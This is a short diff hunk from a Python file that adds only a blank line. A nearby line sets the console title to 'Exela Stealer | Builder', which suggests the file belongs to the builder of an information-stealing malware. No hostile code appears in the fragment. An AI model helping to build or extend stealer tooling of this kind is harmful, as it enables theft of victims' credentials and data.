@@ -10,6 +10,7 @@ import sys
 import re
 import requests
 
+
 try:
     # Set's the console title
     ctypes.windll.kernel32.SetConsoleTitleW(f"Exela Stealer | Builder | {os.getenv('computername')}")
